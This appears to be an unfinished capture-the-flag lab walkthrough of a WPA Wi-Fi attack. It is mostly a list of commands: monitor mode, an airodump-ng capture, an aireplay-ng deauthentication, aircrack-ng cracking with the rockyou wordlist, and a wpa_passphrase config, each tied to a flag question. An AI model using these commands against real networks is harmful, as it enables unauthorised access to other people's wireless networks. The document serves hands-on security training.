# Not Finished

## Commands Used

1st terminal

ssh glitch@[IP_ADD]
password: Password321

iw dev

a interface é o wlan2

sudo iw dev wlan2 scan

sudo ip link set dev wlan2 down
sudo iw dev wlan2 set type monitor
sudo ip link set dev wlan2 up
iw dev

in the 2nd terminal


ssh glitch@[IP_ADD]
password: Password321


1st terminal

sudo airodump-ng wlan2 -> flag (What is the SSID and BSSID of the access point? Format: SSID, BSSID)


sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2 -> flag (What is the BSSID of our wireless interface?)


in the 2nd terminal

sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2

sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap -> flag (What is the PSK after performing the WPA cracking attack?)

wpa_passphrase MalwareM_AP 'ENTER PSK HERE' > config

iw dev -> flag (What is the BSSID of the wireless interface that is already connected to the access point?)

